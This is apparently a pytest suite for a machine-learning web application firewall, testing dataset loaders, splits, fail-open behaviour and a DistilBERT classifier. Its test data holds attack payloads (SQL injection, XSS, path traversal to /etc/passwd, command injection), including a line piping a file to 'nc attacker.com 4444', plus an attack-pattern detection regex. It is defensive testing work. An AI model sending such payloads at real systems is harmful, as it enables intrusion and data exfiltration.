"""Unit tests for the WAF dataset pipeline and classifier.

Covers the pure logic (taxonomy, source loaders, split, predictor decisions and
fail-open). Training a full model is exercised via a small in-test fit on the
seed so the tests need no committed model artifact.
"""
import json
import os
import re
import sys

import pytest

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))
from ml.waf import build_dataset, sources, taxonomy  # noqa: E402
from ml.waf.predictor import WAFClassifier  # noqa: E402

SEED_ATTACKS = os.path.join(os.path.dirname(__file__), "..", "ml", "waf", "data", "seed_attacks.jsonl")
SEED_BENIGN = os.path.join(os.path.dirname(__file__), "..", "ml", "waf", "data", "seed_benign.jsonl")


# --- taxonomy --------------------------------------------------------------
def test_labels_stable_and_indexed():
    assert taxonomy.LABELS[0] == "clean"
    assert taxonomy.LABEL_TO_ID["sqli"] == taxonomy.LABELS.index("sqli")
    assert taxonomy.is_attack("sqli") and not taxonomy.is_attack("clean")


def test_validate_label_rejects_unknown():
    with pytest.raises(ValueError):
        taxonomy.validate_label("nonsense")


# --- sources ---------------------------------------------------------------
def test_normalize_text_collapses_and_caps():
    assert sources.normalize_text("  a\t\tb\r\n ") == "a b"
    assert len(sources.normalize_text("x" * 5000)) == sources.MAX_LEN


def test_load_jsonl_skips_unknown_labels(tmp_path):
    p = tmp_path / "d.jsonl"
    p.write_text(
        '{"text": "a", "label": "sqli"}\n'
        '{"text": "b", "label": "bogus"}\n'
        '{"text": "", "label": "clean"}\n',
        encoding="utf-8",
    )
    recs = list(sources.load_jsonl(str(p)))
    assert len(recs) == 1 and recs[0]["label"] == "sqli"


def test_load_csv_with_label_map(tmp_path):
    p = tmp_path / "d.csv"
    p.write_text("payload,verdict\n' OR 1=1,Anomaly\nhello,Normal\n", encoding="utf-8")
    recs = list(sources.load_csv(str(p), "payload", "verdict", label_map={"Anomaly": "sqli", "Normal": "clean"}))
    labels = sorted(r["label"] for r in recs)
    assert labels == ["clean", "sqli"]


def test_dedupe_drops_exact_duplicates():
    recs = [{"text": "x", "label": "clean"}, {"text": "x", "label": "clean"}, {"text": "y", "label": "clean"}]
    assert len(sources.dedupe(recs)) == 2


def test_writeup_extractor_pulls_payloads_with_hint(tmp_path):
    md = tmp_path / "box.md"
    md.write_text(
        "# Foothold\n## SQL Injection\nTried this:\n```\ncurl 'http://t/?id=1 UNION SELECT 1,2'\n```\n",
        encoding="utf-8",
    )
    cands = list(sources.extract_writeup_candidates(str(md)))
    assert cands and cands[0]["label"] == ""      # unlabeled, needs review
    assert "UNION SELECT" in cands[0]["text"]
    assert cands[0]["hint"] == "SQL Injection"


# --- split -----------------------------------------------------------------
def test_stratified_split_covers_all_classes_and_is_deterministic():
    recs = list(sources.load_jsonl(SEED_ATTACKS)) + list(sources.load_jsonl(SEED_BENIGN))
    a = build_dataset.stratified_split(recs, val=0.15, test=0.15, seed=42)
    b = build_dataset.stratified_split(recs, val=0.15, test=0.15, seed=42)
    assert [r["text"] for r in a["train"]] == [r["text"] for r in b["train"]]  # deterministic
    total = sum(len(v) for v in a.values())
    assert total == len(recs)  # no sample lost


# --- predictor -------------------------------------------------------------
def test_predictor_fail_open_when_model_missing():
    c = WAFClassifier(model_path="/nonexistent/model.joblib")
    assert c.load() is False
    p = c.predict("id=1' OR '1'='1")
    assert p.blocked is False and p.label == "clean"  # fail open, never raise


@pytest.fixture(scope="module")
def fitted_classifier():
    from ml.waf.train import build_pipeline

    recs = list(sources.load_jsonl(SEED_ATTACKS)) + list(sources.load_jsonl(SEED_BENIGN))
    pipe = build_pipeline()
    pipe.fit([r["text"] for r in recs], [r["label"] for r in recs])
    c = WAFClassifier()
    c._pipeline, c._labels, c._loaded = pipe, taxonomy.LABELS, True
    return c


@pytest.mark.parametrize(
    "payload,expected",
    [
        ("id=1' OR '1'='1--", "sqli"),
        ("<script>alert(1)</script>", "xss"),
        ("file=../../../../etc/passwd", "path_traversal"),
        ("host=127.0.0.1; cat /etc/passwd", "command_injection"),
        ("name={{7*7}}", "ssti"),
    ],
)
def test_predictor_blocks_attacks(fitted_classifier, payload, expected):
    p = fitted_classifier.predict(payload)
    assert p.blocked is True
    assert p.label == expected


@pytest.mark.parametrize("benign", ["q=best pizza near me", "email=alice@example.com", "category=electronics&brand=sony"])
def test_predictor_allows_benign(fitted_classifier, benign):
    p = fitted_classifier.predict(benign)
    assert p.blocked is False


# --- ingest CLIs -----------------------------------------------------------
def test_ingest_csv_writes_mapped_jsonl(tmp_path, monkeypatch):
    from ml.waf import ingest
    import argparse

    monkeypatch.setattr(ingest, "EXTERNAL_DIR", str(tmp_path))
    csv_path = tmp_path / "src.csv"
    csv_path.write_text("payload,verdict\n' OR 1=1--,Anomaly\nhello,Normal\n", encoding="utf-8")

    args = argparse.Namespace(file=str(csv_path), text_col="payload", label_col="verdict",
                              map="Anomaly=sqli,Normal=clean", source="unit")
    ingest.cmd_csv(args)

    out = tmp_path / "unit.jsonl"
    assert out.exists()
    labels = sorted(json.loads(l)["label"] for l in out.read_text().splitlines())
    assert labels == ["clean", "sqli"]


def test_ingest_writeup_writes_review_with_blank_labels(tmp_path, monkeypatch):
    from ml.waf import ingest
    import argparse

    monkeypatch.setattr(ingest, "EXTERNAL_DIR", str(tmp_path))
    md = tmp_path / "box.md"
    md.write_text("## SQLi\n```\ncurl 'http://t/?id=1 UNION SELECT 1,2'\n```\n", encoding="utf-8")

    ingest.cmd_writeup(argparse.Namespace(files=[str(md)]))

    out = tmp_path / "review_box.jsonl"
    assert out.exists()
    rec = json.loads(out.read_text().splitlines()[0])
    assert rec["label"] == "" and rec["hint"] == "SQLi"      # unlabeled, for review


# --- transformer backend ----------------------------------------------------
DISTILBERT_DIR = os.path.join(
    os.path.dirname(__file__), "..", "ml", "waf", "artifacts", "waf_distilbert"
)
needs_distilbert = pytest.mark.skipif(
    not os.path.isdir(DISTILBERT_DIR), reason="DistilBERT artifact not present"
)


def test_transformer_fail_open_when_dir_missing():
    c = WAFClassifier(model_path="/nonexistent/waf_distilbert")
    assert c.load() is False
    p = c.predict("id=1' OR '1'='1")
    assert p.blocked is False and p.label == "clean"


@pytest.fixture(scope="module")
def transformer_classifier():
    c = WAFClassifier(model_path=DISTILBERT_DIR)
    assert c.load() is True
    return c


@needs_distilbert
def test_transformer_loads_labels_in_taxonomy_order(transformer_classifier):
    assert transformer_classifier._labels == taxonomy.LABELS


@needs_distilbert
@pytest.mark.parametrize(
    "payload,expected",
    [
        ("id=1' OR '1'='1--", "sqli"),
        ("<script>alert(1)</script>", "xss"),
        ("file=../../../../etc/passwd", "path_traversal"),
    ],
)
def test_transformer_blocks_attacks(transformer_classifier, payload, expected):
    p = transformer_classifier.predict(payload)
    assert p.blocked is True
    assert p.label == expected


@needs_distilbert
@pytest.mark.parametrize(
    "benign",
    [
        "The weather in London is expected to be sunny with light winds.",
        "http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Vino&precio=39",
        # Fixed by the 2026-07-31 clean-corpus retrain (FWAF/ECML/Zanbil/URL-rep,
        # 70k real-traffic samples) — was xfail before, now genuinely passes even
        # at this test's strict WAF_THRESHOLD default of 0.5 (production runs 0.8).
        "category=electronics&brand=sony",
        # Fixed by the follow-up retrain adding ml/waf/synth_benign.py's 8000
        # synthetic login/checkout/search/contact/API bodies. Both now predict
        # "clean" as the TOP label (not just under-threshold), so they pass at
        # any threshold, including a novel login/password pair never seen in
        # training verbatim — a real generalization signal, not memorization.
        "q=best pizza near me",
        "username=admin&password=secret123",
        "user=bob&pwd=Hunter2!",
    ],
)
def test_transformer_allows_benign_in_distribution(transformer_classifier, benign):
    p = transformer_classifier.predict(benign)
    assert p.blocked is False


@pytest.fixture(scope="module")
def transformer_classifier_prod_threshold():
    """Matches the actual deployed WAF_THRESHOLD (0.8), not this suite's
    stricter 0.5 default — some regression cases only fail at the real
    production setting, not at the fixture's default."""
    c = WAFClassifier(model_path=DISTILBERT_DIR, threshold=0.8)
    assert c.load() is True
    return c


@needs_distilbert
@pytest.mark.xfail(
    reason="REGRESSION introduced by the synth-forms retrain, confirmed at "
    "production's actual WAF_THRESHOLD=0.8: command_injection was already the "
    "thinnest class (61 held-out samples, weakest P/R in the taxonomy) and "
    "growing clean+synth further diluted its decision boundary. Root cause: "
    "the SecLists commix payload source (8262 samples, added 2026-07-31) is "
    "100% percent-encoded (%3B, %7C, ...) — it adds volume but not "
    "raw-separator diversity, so literal `;`/`|` next to a plain command "
    "stays out-of-distribution. Needs raw (unencoded) command_injection "
    "samples specifically, not more encoded ones.",
    strict=True,
)
@pytest.mark.parametrize(
    "payload",
    [
        "host=127.0.0.1; cat /etc/passwd",
        "ip=8.8.8.8; whoami",
        "input=$(whoami)",
        "file=test.txt | nc attacker.com 4444",
    ],
)
def test_transformer_blocks_raw_command_injection(transformer_classifier_prod_threshold, payload):
    p = transformer_classifier_prod_threshold.predict(payload)
    assert p.blocked is True


@needs_distilbert
def test_transformer_prediction_contract(transformer_classifier):
    p = transformer_classifier.predict("id=1' OR '1'='1--")
    assert set(p.scores) == set(taxonomy.LABELS)
    assert abs(sum(p.scores.values()) - 1.0) < 1e-3          # softmax distribution
    assert p.risk in {"safe", "low", "medium", "high", "critical"}


# --- synthetic benign form/JSON bodies --------------------------------------
from ml.waf import synth_benign  # noqa: E402

# Substrings that would mean a "clean" sample accidentally looks like an attack
# (Faker's random text can occasionally emit quotes/braces by chance).
_ATTACK_LEAK_RE = re.compile(
    r"' OR |<script|\.\./|;\s*(cat|id|whoami)|\{\{.*\}\}|UNION SELECT", re.IGNORECASE
)


def test_synth_generates_requested_count():
    recs = synth_benign.generate(200, seed=1)
    assert len(recs) == 200


def test_synth_all_records_labeled_clean():
    recs = synth_benign.generate(200, seed=1)
    assert all(r["label"] == "clean" for r in recs)


def test_synth_deterministic_with_seed():
    a = synth_benign.generate(50, seed=7)
    b = synth_benign.generate(50, seed=7)
    assert [r["text"] for r in a] == [r["text"] for r in b]


def test_synth_covers_multiple_domains():
    recs = synth_benign.generate(500, seed=1)
    sources = {r["source"] for r in recs}
    assert len(sources) >= 4, f"expected multiple form domains, got {sources}"


def test_synth_has_structured_bodies():
    # Every record is either a key=value form body or a JSON API payload —
    # never unstructured free English prose.
    recs = synth_benign.generate(200, seed=1)
    structured = [r for r in recs if "=" in r["text"] or (r["text"].startswith("{") and r["text"].endswith("}"))]
    assert len(structured) == len(recs)


def test_synth_varied_key_names_in_login_domain():
    recs = [r for r in synth_benign.generate(300, seed=1) if r["source"] == "synth_login"]
    assert recs, "no login-domain samples generated"
    key_sets = set()
    for r in recs:
        keys = tuple(sorted(kv.split("=")[0] for kv in r["text"].split("&") if "=" in kv))
        key_sets.add(keys)
    assert len(key_sets) >= 3, f"login form key names too uniform: {key_sets}"


def test_synth_no_attack_pattern_leakage():
    recs = synth_benign.generate(2000, seed=1)
    leaked = [r["text"] for r in recs if _ATTACK_LEAK_RE.search(r["text"])]
    assert not leaked, f"synthetic benign data leaked attack-like patterns: {leaked[:5]}"
